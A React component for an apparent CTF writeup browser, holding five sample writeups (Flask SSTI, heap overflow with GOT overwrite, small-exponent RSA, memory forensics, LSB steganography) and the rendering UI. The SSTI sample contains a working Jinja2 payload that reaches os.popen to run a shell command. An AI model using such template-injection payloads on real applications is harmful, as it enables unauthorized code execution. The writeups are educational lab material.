import { useState } from 'react'
import { FileText, Search, Calendar, Eye, Plus } from 'lucide-react'
import Card from '../components/ui/Card.jsx'
import Badge from '../components/ui/Badge.jsx'
import Button from '../components/ui/Button.jsx'

const sampleWriteups = [
  {
    id: 1,
    title: 'Exploiting SSTI in Flask Applications',
    category: 'web',
    ctf: 'HTB Cyber Apocalypse',
    date: 'Mar 18, 2026',
    views: 142,
    tags: ['SSTI', 'Flask', 'Jinja2', 'RCE'],
    content: `# Exploiting SSTI in Flask Applications

## Challenge: Void Whisper (300 pts)

### Reconnaissance

The application was a simple Flask-based web app with a search feature.
Testing \`{{7*7}}\` returned \`49\` — confirming **Server-Side Template Injection**.

### Exploitation

\`\`\`python
# Step 1: Confirm SSTI
payload = "{{7*7}}"  # Returns 49

# Step 2: Access config object
payload = "{{config.items()}}"

# Step 3: RCE via os module
payload = """{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}"""
\`\`\`

### Key Observations

- The app used Jinja2 template engine without sandboxing
- No WAF or input filtering was present
- The \`config\` object gave access to the Python globals

### Flag
\`\`\`
HTB{sst1_fl4sk_t3mpl4t3_1nj3ct10n_m4st3r}
\`\`\`

### Mitigation
- Use \`autoescape=True\` in Jinja2 environment
- Implement strict input validation
- Use sandboxed template rendering`,
  },
  {
    id: 2,
    title: 'Heap Overflow in Custom Allocator',
    category: 'pwn',
    ctf: 'CSAW CTF Quals',
    date: 'Jan 15, 2026',
    views: 89,
    tags: ['Heap', 'Overflow', 'GOT Overwrite'],
    content: `# Heap Overflow in Custom Allocator

## Challenge: Stack Smasher (400 pts)

### Analysis

The binary implemented a custom memory allocator. Using \`checksec\`:

\`\`\`
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
\`\`\`

### Vulnerability

The custom \`malloc\` implementation didn't validate chunk sizes:

\`\`\`c
void* custom_malloc(size_t size) {
    chunk_t* chunk = free_list;
    // Missing bounds check allows overflow
    chunk->size = size;  
    return chunk->data;
}
\`\`\`

### Exploit Strategy

1. Allocate two adjacent chunks
2. Overflow first chunk into second's metadata
3. Overwrite GOT entry for \`free()\` with \`system()\`
4. Free a chunk containing "/bin/sh"

### Flag
\`\`\`
CSAW{h34p_0v3rfl0w_g0t_0v3rwr1t3}
\`\`\``,
  },
  {
    id: 3,
    title: 'Breaking RSA with Small Exponent',
    category: 'crypto',
    ctf: 'PicoCTF 2026',
    date: 'Feb 22, 2026',
    views: 203,
    tags: ['RSA', 'Coppersmith', 'Small-e'],
    content: `# Breaking RSA with Small Exponent

## Challenge: Quantum Lock (450 pts)

### Given

\`\`\`python
n = 0x...  # 2048-bit RSA modulus  
e = 3      # Small public exponent
c = 0x...  # Ciphertext
\`\`\`

### Attack: Cube Root

With \`e=3\` and small plaintext, \`m^3 < n\`, so:

\`\`\`python
from gmpy2 import iroot

m, exact = iroot(c, 3)
if exact:
    flag = bytes.fromhex(hex(m)[2:]).decode()
    print(f"Flag: {flag}")
\`\`\`

### Flag
\`\`\`
picoCTF{sm4ll_3xp0n3nt_b1g_pr0bl3m}
\`\`\``,
  },
  {
    id: 4,
    title: 'Memory Forensics with Volatility',
    category: 'forensics',
    ctf: 'DiceCTF 2025',
    date: 'Dec 5, 2025',
    views: 67,
    tags: ['Volatility', 'Memory', 'Windows'],
    content: `# Memory Forensics with Volatility

## Challenge: Data Ghost (300 pts)

### Steps
1. Identify profile: \`vol.py -f dump.raw imageinfo\`
2. List processes: \`vol.py -f dump.raw --profile=Win10 pslist\`
3. Found suspicious \`svchost.exe\` with unusual parent PID
4. Extracted process memory and found Base64-encoded flag

### Flag
\`\`\`
dice{v0l4t1l1ty_m3m0ry_f0r3ns1cs}
\`\`\``,
  },
  {
    id: 5,
    title: 'LSB Steganography in PNG',
    category: 'stego',
    ctf: 'DownUnderCTF',
    date: 'Sep 14, 2025',
    views: 45,
    tags: ['LSB', 'PNG', 'Steganography'],
    content: `# LSB Steganography in PNG

## Challenge: Hidden Pixels (200 pts)

### Approach

Extract least significant bits from pixel values:

\`\`\`python
from PIL import Image

img = Image.open('challenge.png')
pixels = list(img.getdata())
bits = ''.join(str(p[0] & 1) for p in pixels)
flag = ''.join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8))
print(flag.split('\\x00')[0])
\`\`\`

### Flag
\`\`\`
DUCTF{lsb_st3g0_cl4ss1c}
\`\`\``,
  },
]

export default function Writeups() {
  const [selected, setSelected] = useState(sampleWriteups[0])
  const [search, setSearch] = useState('')

  const filtered = sampleWriteups.filter((w) =>
    w.title.toLowerCase().includes(search.toLowerCase()) ||
    w.tags.some((t) => t.toLowerCase().includes(search.toLowerCase()))
  )

  return (
    <div className="flex flex-col md:flex-row gap-4 h-auto md:h-[calc(100vh-120px)]">
      {/* Writeup List */}
      <div className="w-full md:w-[350px] md:min-w-[350px] flex-shrink-0 flex flex-col gap-3">
        <div className="relative">
          <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-text-dim" />
          <input
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Search writeups..."
            aria-label="Search writeups"
            className="w-full bg-slime-card border border-white/[0.06] rounded-lg pl-8 pr-3 py-2.5
              font-mono text-[12px] text-text-primary placeholder:text-text-faint
              focus:bg-slime-code focus:border-mint/15 focus:outline-none focus-visible:ring-2 focus-visible:ring-mint transition-colors"
          />
        </div>

        <div className="flex items-center justify-between">
          <span className="font-mono text-[11px] text-text-dim">{filtered.length} writeups</span>
          <Button variant="ghost" size="small" aria-label="New writeup"><Plus size={12} /> New</Button>
        </div>

        <div className="flex-1 overflow-y-auto space-y-1">
          {filtered.map((writeup) => (
            <Card
              key={writeup.id}
              active={selected.id === writeup.id}
              onClick={() => setSelected(writeup)}
            >
              <div className="font-heading font-semibold text-[12px] text-text-primary mb-1 truncate">{writeup.title}</div>
              <div className="flex items-center gap-2 mb-1.5">
                <Badge category={writeup.category}>{writeup.category}</Badge>
                <span className="font-mono text-[11px] text-text-faint">{writeup.ctf}</span>
              </div>
              <div className="flex items-center gap-3">
                <div className="flex items-center gap-1">
                  <Calendar size={10} className="text-text-faint" />
                  <span className="font-mono text-[11px] text-text-faint">{writeup.date}</span>
                </div>
                <div className="flex items-center gap-1">
                  <Eye size={10} className="text-text-faint" />
                  <span className="font-mono text-[11px] text-text-faint">{writeup.views}</span>
                </div>
              </div>
              <div className="flex flex-wrap gap-1 mt-1.5">
                {writeup.tags.map((tag) => (
                  <span key={tag} className="font-mono text-[10px] text-text-dim bg-white/[0.04] rounded px-1.5 py-0.5">{tag}</span>
                ))}
              </div>
            </Card>
          ))}
        </div>
      </div>

      {/* Preview Panel */}
      <Card className="flex-1 flex flex-col min-w-0">
        <div className="flex items-center justify-between mb-3">
          <div>
            <h2 className="font-heading font-bold text-[16px] text-text-primary">{selected.title}</h2>
            <div className="flex items-center gap-2 mt-1">
              <Badge category={selected.category}>{selected.category}</Badge>
              <span className="font-mono text-[11px] text-text-dim">{selected.ctf}</span>
              <span className="font-mono text-[11px] text-text-faint">{selected.date}</span>
            </div>
          </div>
        </div>
        <div className="flex-1 bg-slime-code rounded-md border border-white/[0.04] overflow-y-auto p-5">
          <div className="prose-invert max-w-none">
            {selected.content.split('\n').map((line, i) => {
              if (line.startsWith('# ')) return <h1 key={i} className="font-heading font-bold text-[20px] text-text-primary mt-4 mb-2">{line.slice(2)}</h1>
              if (line.startsWith('## ')) return <h2 key={i} className="font-heading font-bold text-[16px] text-mint mt-4 mb-2">{line.slice(3)}</h2>
              if (line.startsWith('### ')) return <h3 key={i} className="font-heading font-semibold text-[14px] text-text-secondary mt-3 mb-1.5">{line.slice(4)}</h3>
              if (line.startsWith('```')) return <div key={i} className="border-t border-white/[0.06] my-1" />
              if (line.startsWith('- ')) return <div key={i} className="font-mono text-[11px] text-text-muted ml-3 mb-0.5">• {line.slice(2)}</div>
              if (line.trim() === '') return <div key={i} className="h-2" />
              return <p key={i} className="font-mono text-[11px] text-text-secondary leading-relaxed">{line}</p>
            })}
          </div>
        </div>
      </Card>
    </div>
  )
}
